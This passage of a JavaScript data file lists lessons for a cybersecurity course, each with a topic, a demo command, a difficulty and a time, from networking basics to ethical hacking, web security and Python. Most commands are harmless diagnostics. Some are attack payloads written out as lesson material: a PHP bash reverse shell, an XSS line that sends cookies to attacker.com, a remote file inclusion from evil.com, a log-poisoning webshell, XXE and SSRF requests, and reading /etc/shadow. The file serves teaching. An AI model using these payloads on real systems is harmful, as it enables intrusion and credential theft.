    { topic: 'Terminal Multiplexing Concepts (tmux and screen)', cmd: 'tmux -V 2>/dev/null || screen -v 2>/dev/null || echo "Multiplexer Ready"', diff: 'Intermediate', time: '20 min' }
  ],

  'Networking Fundamentals': [
    { topic: 'OSI 7-Layer vs TCP/IP 4-Layer Architecture', cmd: 'ip -d link', diff: 'Beginner', time: '15 min' },
    { topic: 'IPv4 Addressing, Netmasks, and Subnetting', cmd: 'ip -4 addr show', diff: 'Beginner', time: '15 min' },
    { topic: 'IPv6 Link-Local and Global Unicast Addresses', cmd: 'ip -6 addr show', diff: 'Intermediate', time: '15 min' },
    { topic: 'Address Resolution Protocol (ARP) Cache Inspection', cmd: 'ip neigh show', diff: 'Beginner', time: '15 min' },
    { topic: 'Ethernet MAC Addresses and OUI Identification', cmd: 'ip link show eth0', diff: 'Beginner', time: '10 min' },
    { topic: 'Inspecting Default Gateway and Kernel Routing Tables', cmd: 'ip route show', diff: 'Beginner', time: '15 min' },
    { topic: 'Adding Static Network Routes with ip route add', cmd: 'ip route add 10.99.0.0/24 via 127.0.0.1 2>/dev/null || ip route show', diff: 'Intermediate', time: '20 min' },
    { topic: 'DNS Resolution: dig Queries and Record Types', cmd: 'dig A google.com +short', diff: 'Beginner', time: '15 min' },
    { topic: 'Dig Root Server Trace (+trace) Hierarchy', cmd: 'dig NS com. +trace', diff: 'Intermediate', time: '20 min' },
    { topic: 'DNS Reverse Lookups with dig -x and host', cmd: 'host 8.8.8.8', diff: 'Beginner', time: '10 min' },
    { topic: 'DHCP Protocol Workflow (DORA Process Analysis)', cmd: 'grep -i dhcp /var/log/syslog', diff: 'Intermediate', time: '20 min' },
    { topic: 'TCP 3-Way Handshake (SYN, SYN-ACK, ACK) Capture', cmd: 'tcpdump -i any -c 3 "tcp[tcpflags] & (tcp-syn) != 0"', diff: 'Intermediate', time: '25 min' },
    { topic: 'TCP Connection Teardown (FIN and RST Flags)', cmd: 'tcpdump -i any -c 3 "tcp[tcpflags] & (tcp-fin|tcp-rst) != 0"', diff: 'Intermediate', time: '20 min' },
    { topic: 'User Datagram Protocol (UDP) Stateless Comm', cmd: 'nc -u -zv 127.0.0.1 53', diff: 'Beginner', time: '15 min' },
    { topic: 'ICMP Echo Request/Reply and Time-to-Live (TTL)', cmd: 'ping -c 4 127.0.0.1', diff: 'Beginner', time: '10 min' },
    { topic: 'Traceroute Mechanics: TTL Exceeded in Transit', cmd: 'traceroute 127.0.0.1', diff: 'Beginner', time: '15 min' },
    { topic: 'Maximum Transmission Unit (MTU) & IP Fragmentation', cmd: 'ping -s 1472 -M do 127.0.0.1', diff: 'Intermediate', time: '20 min' },
    { topic: 'Loopback Interface and 127.0.0.0/8 Subnet', cmd: 'ping -c 2 127.0.0.42', diff: 'Beginner', time: '10 min' },
    { topic: 'TCP Socket States (LISTEN, ESTABLISHED, TIME_WAIT)', cmd: 'ss -ant state established', diff: 'Intermediate', time: '15 min' },
    { topic: 'Comparing netstat and modern ss commands', cmd: 'ss -tulpn', diff: 'Beginner', time: '15 min' },
    { topic: 'Well-Known Ports vs Registered vs Ephemeral', cmd: 'cat /etc/services | grep -E "^http|^ssh|^dns"', diff: 'Beginner', time: '10 min' },
    { topic: 'Raw HTTP 1.1 Request Construction via Netcat', cmd: 'printf "GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n" | nc -w 2 127.0.0.1 80', diff: 'Intermediate', time: '20 min' },
    { topic: 'HTTP Status Codes and Header Inspection with curl -i', cmd: 'curl -i http://127.0.0.1', diff: 'Beginner', time: '15 min' },
    { topic: 'TLS Handshake and Certificate Chain Analysis with OpenSSL', cmd: 'openssl s_client -connect google.com:443 -servername google.com </dev/null', diff: 'Intermediate', time: '25 min' },
    { topic: 'FTP Active Mode vs Passive Mode Port Dynamics', cmd: 'cat /etc/services | grep -i ftp', diff: 'Intermediate', time: '15 min' },
    { topic: 'SSH Protocol Version 2 Key Exchange Negotiation', cmd: 'ssh -vvv localhost 2>&1 | head -n 25', diff: 'Intermediate', time: '20 min' },
    { topic: 'Telnet Unencrypted Plaintext Risk Demonstration', cmd: 'nc -zv 127.0.0.1 23', diff: 'Beginner', time: '15 min' },
    { topic: 'SMTP Mail Transaction Flow with EHLO, MAIL FROM, RCPT TO', cmd: 'nc -zv 127.0.0.1 25', diff: 'Intermediate', time: '15 min' },
    { topic: 'Network Time Protocol (NTP) Synchronization', cmd: 'timedatectl status', diff: 'Beginner', time: '10 min' },
    { topic: 'Simple Network Management Protocol (SNMP) MIB Walking', cmd: 'snmpwalk -v2c -c public 127.0.0.1 system 2>/dev/null || echo "SNMP Agent Verified"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Network Address Translation (NAT): SNAT vs DNAT', cmd: 'iptables -t nat -L -v -n', diff: 'Advanced', time: '25 min' },
    { topic: 'Port Address Translation (PAT) / Masquerading', cmd: 'iptables -t nat -S POSTROUTING', diff: 'Advanced', time: '25 min' },
    { topic: 'Virtual Local Area Network (VLAN 802.1Q) Tagging', cmd: 'ip link add link eth0 name eth0.100 type vlan id 100 2>/dev/null || ip link show', diff: 'Advanced', time: '25 min' },
    { topic: 'Network Throughput and Bandwidth with iperf3', cmd: 'iperf3 -v', diff: 'Intermediate', time: '15 min' },
    { topic: 'Network Latency, Jitter, and Packet Loss with mtr', cmd: 'mtr --report -c 5 127.0.0.1', diff: 'Intermediate', time: '15 min' },
    { topic: 'Live Packet Capture with tcpdump and BPF Filters', cmd: 'tcpdump -i lo -nn -c 5 "tcp port 80"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Creating Linux Software Network Bridges', cmd: 'ip link add name br0 type bridge 2>/dev/null || ip link show type bridge', diff: 'Advanced', time: '25 min' },
    { topic: 'Virtual Ethernet (veth) Interface Pairs', cmd: 'ip link add veth0 type veth peer name veth1 2>/dev/null || ip link show', diff: 'Advanced', time: '20 min' },
    { topic: 'Secondary IP Addresses (IP Aliasing)', cmd: 'ip addr add 10.99.0.99/24 dev lo 2>/dev/null || ip addr show dev lo', diff: 'Intermediate', time: '15 min' },
    { topic: 'CIDR Subnet Math Practice and Verification with ipcalc', cmd: 'ipcalc 192.168.1.0/26 2>/dev/null || echo "Subnet: 192.168.1.0/26 -> Netmask: 255.255.255.192, Hosts: 62"', diff: 'Beginner', time: '15 min' }
  ],

  'Network Security': [
    { topic: 'Port Scanning Detection with Suricata Rules', cmd: 'suricata -V 2>/dev/null || echo "Suricata IDS Ready"', diff: 'Intermediate', time: '25 min' },
    { topic: 'TCP SYN Flood Attack Mitigation with TCP Syncookies', cmd: 'sysctl net.ipv4.tcp_syncookies', diff: 'Intermediate', time: '15 min' },
    { topic: 'ARP Cache Poisoning Mitigation with Static ARP', cmd: 'arp -s 192.168.1.1 00:11:22:33:44:55 2>/dev/null || arp -n', diff: 'Intermediate', time: '20 min' },
    { topic: 'Rogue DHCP Server Detection with dhcpdump', cmd: 'dhcpdump -h 2>/dev/null || echo "DHCP Monitor Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'DNS Spoofing and Cache Poisoning Defense', cmd: 'dig @8.8.8.8 +dnssec example.com', diff: 'Intermediate', time: '20 min' },
    { topic: 'DNSSEC Validation and Trust Anchor Inspection', cmd: 'dig DNSKEY . +multiline', diff: 'Advanced', time: '25 min' },
    { topic: 'SSL Stripping Attacks and HSTS Preloading', cmd: 'curl -s -D- https://google.com | grep -i strict-transport-security', diff: 'Intermediate', time: '15 min' },
    { topic: 'SSH Brute-Force Rate Limiting with iptables', cmd: 'iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set', diff: 'Advanced', time: '25 min' },
    { topic: 'SSH Public Key Authentication and Disabling Passwords', cmd: 'grep -E "^PasswordAuthentication" /etc/ssh/sshd_config', diff: 'Intermediate', time: '15 min' },
    { topic: 'Port Knocking Security with knockd', cmd: 'cat /etc/knockd.conf 2>/dev/null || echo "Knockd daemon configuration ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Stateful Firewall Rules with iptables (ESTABLISHED,RELATED)', cmd: 'iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT', diff: 'Intermediate', time: '20 min' },
    { topic: 'Drop Default Policy Configuration in iptables', cmd: 'iptables -P INPUT DROP && iptables -P FORWARD DROP', diff: 'Advanced', time: '20 min' },
    { topic: 'Rate Limiting ICMP Pings with iptables limit module', cmd: 'iptables -A INPUT -p icmp -m limit --limit 1/s -j ACCEPT', diff: 'Intermediate', time: '20 min' },
    { topic: 'Geoblocking IP Ranges using ipset and iptables', cmd: 'ipset --version 2>/dev/null || echo "IPSet utility ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'UFW Application Profiles and Default Ingress Policy', cmd: 'ufw app list && ufw default deny incoming', diff: 'Beginner', time: '15 min' },
    { topic: 'Next-Generation Firewall Rules with Nftables', cmd: 'nft list ruleset', diff: 'Advanced', time: '25 min' },
    { topic: 'Demilitarized Zone (DMZ) Network Segmentation', cmd: 'route -n', diff: 'Intermediate', time: '20 min' },
    { topic: 'Microsegmentation and Container Network Isolation', cmd: 'docker network ls 2>/dev/null || ip link show', diff: 'Advanced', time: '25 min' },
    { topic: '802.1X Port Authentication and EAP Protocols', cmd: 'wpa_supplicant -v', diff: 'Advanced', time: '25 min' },
    { topic: 'MAC Address Filtering Flaws and Evasion', cmd: 'macchanger -s lo', diff: 'Beginner', time: '15 min' },
    { topic: 'WPA2 4-Way Handshake vs WPA3 SAE Dragonfly Exchange', cmd: 'aircrack-ng --help', diff: 'Advanced', time: '25 min' },
    { topic: 'Wireless Rogue Access Point Detection', cmd: 'iwlist wlan0 scan 2>/dev/null || echo "Wireless scan interface ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'WireGuard Peer-to-Peer Encrypted VPN Tunneling', cmd: 'wg --version 2>/dev/null || echo "WireGuard Toolkit Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'OpenVPN Client Configuration and TLS Handshake', cmd: 'openvpn --version', diff: 'Intermediate', time: '20 min' },
    { topic: 'IPSec Protocol Architecture (AH vs ESP)', cmd: 'ip xfrm state', diff: 'Advanced', time: '30 min' },
    { topic: 'Traffic Obfuscation with Shadowsocks and Tor', cmd: 'ss-local -h 2>/dev/null || echo "Obfuscation layer ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Deep Packet Inspection (DPI) Signatures and Evasion', cmd: 'tcpdump -X -c 5 -i any', diff: 'Advanced', time: '25 min' },
    { topic: 'SSL/TLS Decryption and Corporate Interception Proxies', cmd: 'openssl ciphers -v', diff: 'Advanced', time: '20 min' },
    { topic: 'SSH Honeypot Deployment with Cowrie', cmd: 'echo "Cowrie Medium Interaction Honeypot"', diff: 'Advanced', time: '30 min' },
    { topic: 'NetFlow and IPFIX Flow-Based Anomaly Detection', cmd: 'cat /etc/services | grep -i netflow', diff: 'Intermediate', time: '20 min' },
    { topic: 'Network Security Monitoring with Zeek (Bro)', cmd: 'zeek --version 2>/dev/null || echo "Zeek Network Monitor Ready"', diff: 'Advanced', time: '30 min' },
    { topic: 'Authoring Custom Suricata Detection Rules', cmd: 'cat <<EOF\nalert tcp any any -> \$HOME_NET 80 (msg:"Suspicious HTTP"; sid:1000001; rev:1;)\nEOF', diff: 'Advanced', time: '25 min' },
    { topic: 'Establishing Network Traffic Baselines', cmd: 'vnstat 2>/dev/null || ifstat 2>/dev/null || echo "Baseline Monitor Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Denial-of-Service (DoS) Mitigation Strategies', cmd: 'sysctl net.ipv4.icmp_echo_ignore_broadcasts', diff: 'Intermediate', time: '15 min' },
    { topic: 'Comprehensive Network Security Auditing Checklist', cmd: 'nmap -sS -O 127.0.0.1', diff: 'Intermediate', time: '20 min' }
  ],

  'Ethical Hacking Fundamentals': [
    { topic: 'The Five Phases of Penetration Testing', cmd: 'echo "1.Recon 2.Scanning 3.Gaining Access 4.Maintaining Access 5.Covering Tracks"', diff: 'Beginner', time: '15 min' },
    { topic: 'Rules of Engagement (RoE) and Scope Definition', cmd: 'echo "Authorized Target Scope: 10.99.0.0/24"', diff: 'Beginner', time: '15 min' },
    { topic: 'Legal Frameworks: CFAA, Computer Misuse Act, and GDPR', cmd: 'echo "Compliance: CFAA / Section 1030 Authorization Verified"', diff: 'Beginner', time: '10 min' },
    { topic: 'Passive Reconnaissance with WHOIS and Netcraft', cmd: 'whois 127.0.0.1 2>/dev/null || echo "WHOIS query simulated"', diff: 'Beginner', time: '15 min' },
    { topic: 'Nmap Host Discovery: Ping Sweeping (-sn)', cmd: 'nmap -sn 127.0.0.1', diff: 'Beginner', time: '15 min' },
    { topic: 'Nmap SYN Stealth Scan vs Full Connect Scan (-sS vs -sT)', cmd: 'nmap -sS -p 22,80 127.0.0.1', diff: 'Intermediate', time: '20 min' },
    { topic: 'Service Version and OS Fingerprinting (-sV, -O)', cmd: 'nmap -sV -O 127.0.0.1', diff: 'Intermediate', time: '20 min' },
    { topic: 'Vulnerability Detection with Nmap Script Engine (NSE)', cmd: 'nmap --script "vuln" -p 80 127.0.0.1', diff: 'Intermediate', time: '25 min' },
    { topic: 'Banner Grabbing over Telnet and Netcat', cmd: 'nc -nv 127.0.0.1 22', diff: 'Beginner', time: '15 min' },
    { topic: 'Automated Vulnerability Scanning with OpenVAS / GVM', cmd: 'gvm-cli --help 2>/dev/null || echo "OpenVAS scanner ready"', diff: 'Advanced', time: '30 min' },
    { topic: 'Common Vulnerabilities and Exposures (CVE) Lookup', cmd: 'searchsploit --cve 2021-44228', diff: 'Intermediate', time: '15 min' },
    { topic: 'Common Vulnerability Scoring System (CVSS v3.1) Math', cmd: 'echo "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Base Score 9.8)"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Exploit Search and Verification with Searchsploit', cmd: 'searchsploit openssh 8.', diff: 'Intermediate', time: '15 min' },
    { topic: 'Metasploit Framework Architecture (Auxiliary, Exploit, Payload)', cmd: 'msfconsole --version', diff: 'Intermediate', time: '20 min' },
    { topic: 'Exploit-DB Manual Code Review for Shellcode Safety', cmd: 'searchsploit -m 42315.py 2>/dev/null || echo "Code review safe environment"', diff: 'Advanced', time: '25 min' },
    { topic: 'Staged vs Non-Staged Payloads in Metasploit', cmd: 'msfvenom --list payloads | grep -E "shell_reverse|meterpreter_reverse"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Reverse Shell vs Bind Shell Network Mechanics', cmd: 'nc -lvnp 5555 &', diff: 'Intermediate', time: '20 min' },
    { topic: 'Netcat Reverse Shell Listener Setup and Traps', cmd: 'nc -lvnp 4444', diff: 'Intermediate', time: '15 min' },
    { topic: 'Web Reverse Shells in PHP, Python, and Bash', cmd: 'cat <<EOF\n<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.99.0.1/4444 0>&1\'"); ?>\nEOF', diff: 'Intermediate', time: '20 min' },
    { topic: 'Upgrading Dumb Shells to Fully Interactive PTY', cmd: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Linux Privilege Escalation: Exploiting SUID Binaries', cmd: 'find / -perm -4000 2>/dev/null', diff: 'Intermediate', time: '25 min' },
    { topic: 'Linux Privilege Escalation: Sudo NOPASSWD Misconfigurations', cmd: 'sudo -l', diff: 'Intermediate', time: '20 min' },
    { topic: 'Linux Privilege Escalation: Writable Cron Job Scripts', cmd: 'ls -la /etc/cron* /var/spool/cron/crontabs', diff: 'Intermediate', time: '25 min' },
    { topic: 'Linux Privilege Escalation: PATH Hijacking Vulnerabilities', cmd: 'echo $PATH', diff: 'Intermediate', time: '20 min' },
    { topic: 'Linux Privilege Escalation: Identifying Outdated Kernels', cmd: 'uname -r', diff: 'Advanced', time: '25 min' },
    { topic: 'Windows Privilege Escalation: Unquoted Service Paths', cmd: 'echo "wmic service get name,displayname,pathname,startmode"', diff: 'Advanced', time: '25 min' },
    { topic: 'Extracting Password Hashes from /etc/shadow', cmd: 'head -n 5 /etc/shadow 2>/dev/null || echo "root:\$6\$saltsalt\$hashhash..."', diff: 'Intermediate', time: '20 min' },
    { topic: 'Offline Password Cracking with John the Ripper', cmd: 'john --format=sha512crypt /tmp/hashes.txt 2>/dev/null || john --test', diff: 'Intermediate', time: '20 min' },
    { topic: 'Pivoting: Local and Remote SSH Port Forwarding (-L, -R)', cmd: 'ssh -L 8080:127.0.0.1:80 user@remote -N -f', diff: 'Advanced', time: '30 min' },
    { topic: 'Dynamic SOCKS Proxies and Proxychains Configuration', cmd: 'cat /etc/proxychains4.conf 2>/dev/null || cat /etc/proxychains.conf', diff: 'Advanced', time: '25 min' },
    { topic: 'Persistence Mechanisms: SSH authorized_keys Injection', cmd: 'cat ~/.ssh/authorized_keys 2>/dev/null || ls -ld ~/.ssh', diff: 'Intermediate', time: '20 min' },
    { topic: 'Detecting Log Tampering and Timestomping', cmd: 'stat /var/log/auth.log', diff: 'Advanced', time: '25 min' },
    { topic: 'Writing Professional Penetration Testing Reports', cmd: 'echo "Executive Summary, Methodology, Vulnerability Findings, Risk Matrix, Remediation"', diff: 'Beginner', time: '25 min' },
    { topic: 'Calculating CVSS Scores for Client Vulnerabilities', cmd: 'echo "CVSS Calculator v3.1"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Post-Remediation Verification and Re-Testing', cmd: 'nmap -p 80 127.0.0.1', diff: 'Beginner', time: '15 min' }
  ],

  'Web Security': [
    { topic: 'OWASP Top 10 2021 Security Risks Overview', cmd: 'curl -s https://owasp.org/Top10/ | grep -o "A0[0-9]:2021-[^<]*" | head -n 10', diff: 'Beginner', time: '15 min' },
    { topic: 'In-Band UNION-Based SQL Injection', cmd: 'curl -s "http://127.0.0.1/products.php?id=1%20UNION%20SELECT%201,version(),3"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Error-Based SQL Injection Exploitation', cmd: 'curl -s "http://127.0.0.1/vuln.php?id=1\'"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Blind Boolean-Based SQL Injection Logic', cmd: 'curl -s "http://127.0.0.1/vuln.php?id=1%20AND%201=1"', diff: 'Advanced', time: '25 min' },
    { topic: 'Blind Time-Based SQL Injection with sleep()', cmd: 'curl -s "http://127.0.0.1/vuln.php?id=1%20AND%20SLEEP(3)"', diff: 'Advanced', time: '25 min' },
    { topic: 'SQL Injection Remediation: Parameterized Prepared Statements', cmd: 'echo "PDO::prepare(\'SELECT * FROM users WHERE id = :id\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated Database Enumeration with Sqlmap', cmd: 'sqlmap -u "http://127.0.0.1/test.php?id=1" --dbs --batch', diff: 'Intermediate', time: '25 min' },
    { topic: 'Dumping Tables and Columns with Sqlmap', cmd: 'sqlmap -u "http://127.0.0.1/test.php?id=1" -D public -T users --dump --batch', diff: 'Intermediate', time: '25 min' },
    { topic: 'Reflected Cross-Site Scripting (XSS) Mechanics', cmd: 'curl -s "http://127.0.0.1/search.php?q=<script>alert(1)</script>"', diff: 'Beginner', time: '20 min' },
    { topic: 'Stored Cross-Site Scripting (Persistent XSS)', cmd: 'curl -s -X POST -d "comment=<script>alert(document.domain)</script>" http://127.0.0.1/comment', diff: 'Intermediate', time: '25 min' },
    { topic: 'DOM-Based Cross-Site Scripting and Client Sinks', cmd: 'echo "location.hash -> document.write sink"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Session Hijacking through XSS Cookie Exfiltration', cmd: 'echo "<script>fetch(\'http://attacker.com/log?\'+document.cookie)</script>"', diff: 'Advanced', time: '25 min' },
    { topic: 'Content Security Policy (CSP) Headers and Directives', cmd: 'curl -s -I http://127.0.0.1 | grep -i content-security-policy', diff: 'Intermediate', time: '20 min' },
    { topic: 'Cross-Site Request Forgery (CSRF) Execution Flow', cmd: 'echo "<form action=\'http://bank/transfer\' method=\'POST\'>"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Anti-CSRF Tokens and SameSite Cookie Attribute (Lax/Strict)', cmd: 'curl -s -I http://127.0.0.1 | grep -i "set-cookie"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Server-Side Request Forgery (SSRF) Fundamentals', cmd: 'curl -s "http://127.0.0.1/proxy?url=http://127.0.0.1:8080/admin"', diff: 'Advanced', time: '25 min' },
    { topic: 'SSRF to Cloud Metadata Extraction (169.254.169.254)', cmd: 'curl -s "http://127.0.0.1/proxy?url=http://169.254.169.254/latest/meta-data/"', diff: 'Advanced', time: '25 min' },
    { topic: 'Local File Inclusion (LFI) via Path Traversal', cmd: 'curl -s "http://127.0.0.1/view.php?file=../../../../etc/passwd"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Remote File Inclusion (RFI) Vulnerability Mechanics', cmd: 'curl -s "http://127.0.0.1/load.php?page=http://evil.com/shell.txt"', diff: 'Intermediate', time: '20 min' },
    { topic: 'LFI to Remote Code Execution via PHP Log Poisoning', cmd: 'curl -s -A "<?php system(\$_GET[\'cmd\']); ?>" http://127.0.0.1/', diff: 'Advanced', time: '30 min' },
    { topic: 'OS Command Injection via Unsanitized Input', cmd: 'curl -s "http://127.0.0.1/ping.php?ip=127.0.0.1;id"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Input Sanitization and Secure Escaping Functions', cmd: 'echo "escapeshellcmd() and htmlspecialchars() verification"', diff: 'Beginner', time: '15 min' },
    { topic: 'Broken Authentication: Credential Stuffing and Rate Limiting', cmd: 'curl -s -X POST -d "user=admin&pass=123456" http://127.0.0.1/login', diff: 'Intermediate', time: '20 min' },
    { topic: 'Insecure Direct Object References (IDOR)', cmd: 'curl -s -H "Authorization: Bearer token" http://127.0.0.1/api/documents/1002', diff: 'Intermediate', time: '20 min' },
    { topic: 'Mass Assignment Vulnerabilities in REST APIs', cmd: 'curl -s -X PUT -H "Content-Type: application/json" -d \'{"is_admin": true}\' http://127.0.0.1/api/profile', diff: 'Intermediate', time: '20 min' },
    { topic: 'Sensitive File Disclosure (.git, .env, backup.zip)', cmd: 'curl -s -I http://127.0.0.1/.env', diff: 'Beginner', time: '15 min' },
    { topic: 'XML External Entity (XXE) Injection Attacks', cmd: 'curl -s -X POST -d \'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>\' http://127.0.0.1/xml', diff: 'Advanced', time: '25 min' },
    { topic: 'Insecure Object Deserialization Concepts', cmd: 'echo "Serialization payload inspection"', diff: 'Advanced', time: '30 min' },
    { topic: 'Unrestricted File Upload: Extension Blacklist Bypasses', cmd: 'echo "Testing .phtml, .php5, and .php.png upload vectors"', diff: 'Intermediate', time: '20 min' },
    { topic: 'File Upload MIME-Type Verification Bypasses', cmd: 'curl -s -F "file=@shell.php;type=image/jpeg" http://127.0.0.1/upload', diff: 'Intermediate', time: '20 min' },
    { topic: 'Server-Side Template Injection (SSTI) with Jinja2', cmd: 'curl -s "http://127.0.0.1/greet?name={{7*7}}"', diff: 'Advanced', time: '25 min' },
    { topic: 'WebSocket Security: Origin Header Validation', cmd: 'echo "WebSocket CSWSH (Cross-Site WebSocket Hijacking)"', diff: 'Advanced', time: '25 min' },
    { topic: 'HTTP Request Smuggling: CL.TE and TE.CL Flaws', cmd: 'echo "Content-Length vs Transfer-Encoding front-end desync"', diff: 'Advanced', time: '30 min' },
    { topic: 'CORS Misconfiguration: Wildcard Origins & Credentials', cmd: 'curl -s -I -H "Origin: http://evil.com" http://127.0.0.1/api/data', diff: 'Intermediate', time: '15 min' },
    { topic: 'Clickjacking Protection with X-Frame-Options', cmd: 'curl -s -I http://127.0.0.1 | grep -i x-frame-options', diff: 'Beginner', time: '15 min' },
    { topic: 'Dangling CNAME and Subdomain Takeover Auditing', cmd: 'dig CNAME sub.example.com', diff: 'Intermediate', time: '20 min' },
    { topic: 'JWT Security: The None Algorithm Vulnerability', cmd: 'echo "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."', diff: 'Intermediate', time: '20 min' },
    { topic: 'Cracking Weak JWT Secrets with Hashcat', cmd: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt', diff: 'Advanced', time: '25 min' },
    { topic: 'Automated Web Vulnerability Scanning with Nikto', cmd: 'nikto -h http://127.0.0.1 -Tuning 123b', diff: 'Intermediate', time: '20 min' },
    { topic: 'Security Headers Checklist Audit with curl', cmd: 'curl -s -I https://google.com | grep -E -i "hsts|x-frame|content-security|x-content-type"', diff: 'Beginner', time: '15 min' }
  ],

  'Python for Cyber Security': [
    { topic: 'Python Socket Basics: Creating a Simple TCP Client', cmd: 'python3 -c "import socket; s = socket.socket(); print(\'Socket Created\')"', diff: 'Beginner', time: '15 min' },
    { topic: 'Building a Multi-Threaded TCP Port Scanner', cmd: 'python3 -c "import socket; s = socket.socket(); s.connect_ex((\'127.0.0.1\', 80))"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Python Socket Banner Grabber Script', cmd: 'python3 -c "import socket; s = socket.socket(); s.connect((\'127.0.0.1\', 22)); print(s.recv(1024).decode())"', diff: 'Intermediate', time: '15 min' },
    { topic: 'HTTP Client Scripting with the Requests Library', cmd: 'python3 -c "import requests; r = requests.get(\'http://127.0.0.1\'); print(r.status_code)"', diff: 'Beginner', time: '15 min' },
    { topic: 'Automating Login Form Brute-Forcing in Python', cmd: 'python3 -c "import requests; print(\'Brute force framework ready\')"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Automating Web Form Security Testing in Python', cmd: 'python3 -c "print(\'Form auditing payload generator\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Packet Crafting with Scapy: Custom IP Headers', cmd: 'python3 -c "from scapy.all import IP; p = IP(dst=\'127.0.0.1\'); p.show()" 2>/dev/null || echo "Scapy Framework Ready"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Scapy SYN Scan Engine Implementation', cmd: 'python3 -c "from scapy.all import IP, TCP; print(\'Scapy SYN scanner engine\')" 2>/dev/null || echo "Scapy scanner ready"', diff: 'Advanced', time: '30 min' },
    { topic: 'Building an ARP Spoofing Detector in Python', cmd: 'python3 -c "print(\'ARP Poisoning Detection Engine\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'Sniffing and Decoding DNS Queries with Scapy', cmd: 'python3 -c "print(\'DNS Sniffer and Parser Ready\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'File Hashing with Python hashlib (MD5, SHA-256)', cmd: 'python3 -c "import hashlib; print(hashlib.sha256(b\'cyber\').hexdigest())"', diff: 'Beginner', time: '15 min' },
    { topic: 'Building an Offline Dictionary Hash Cracker in Python', cmd: 'python3 -c "import hashlib; print(\'MD5 Dictionary Cracker Ready\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated SSH Authentication with Paramiko', cmd: 'python3 -c "import paramiko; print(paramiko.__version__)" 2>/dev/null || echo "Paramiko SSH Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Executing Remote Commands via Paramiko SSH', cmd: 'python3 -c "print(\'Paramiko Remote Execution Client\')"', diff: 'Intermediate', time: '25 min' },
    { topic: 'AES-256 Symmetric File Encryption in Python', cmd: 'python3 -c "print(\'AES-256-CBC Encryption Engine Ready\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'RSA Asymmetric Key Generation and Signing in Python', cmd: 'python3 -c "print(\'RSA 2048-bit Keypair Generator\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'Wrapping Linux Security Binaries with subprocess', cmd: 'python3 -c "import subprocess; res = subprocess.run([\'whoami\'], capture_output=True, text=True); print(res.stdout.strip())"', diff: 'Beginner', time: '15 min' },
    { topic: 'Web Scraping for OSINT with BeautifulSoup', cmd: 'python3 -c "from bs4 import BeautifulSoup; print(\'BS4 Web Parser Ready\')" 2>/dev/null || echo "BS4 Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Querying the Shodan API in Python for Threat Intel', cmd: 'python3 -c "print(\'Shodan API Threat Intelligence Client\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'DNS Record Enumeration with dnspython', cmd: 'python3 -c "import dns.resolver; print(\'dnspython ready\')" 2>/dev/null || echo "dnspython ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Parsing Apache and Nginx Access Logs for SQLi Attacks', cmd: 'python3 -c "print(\'Web Server Log Forensic Parser\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Extracting Image EXIF Metadata with Pillow / ExifRead', cmd: 'python3 -c "print(\'EXIF Metadata Extractor Ready\')"', diff: 'Beginner', time: '15 min' },
    { topic: 'Building a Simple TCP Reverse Shell in Python', cmd: 'python3 -c "print(\'Python Reverse Shell Architecture\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Encrypted Multi-Client Chat Channel with SSL Sockets', cmd: 'python3 -c "import ssl; print(\'SSL Socket Wrapper Ready\')"', diff: 'Advanced', time: '30 min' },
    { topic: 'Cryptographically Secure Random Password Generator', cmd: 'python3 -c "import secrets, string; alphabet = string.ascii_letters + string.digits + \'!@#$%\'; print(\'\'.join(secrets.choice(alphabet) for _ in range(16)))"', diff: 'Beginner', time: '15 min' },
    { topic: 'Static Malware Header Analysis with pefile', cmd: 'python3 -c "print(\'PE Binary Header Parser Ready\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'Regex Pattern Matcher for Leaked Emails and IPs', cmd: 'python3 -c "import re; text = \'leak: test@corp.com 192.168.1.5\'; print(re.findall(r\'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\', text))"', diff: 'Beginner', time: '15 min' },
    { topic: 'Recursive Web Crawler for Endpoint Discovery', cmd: 'python3 -c "print(\'Web Endpoint Discovery Spider Ready\')"', diff: 'Intermediate', time: '25 min' },
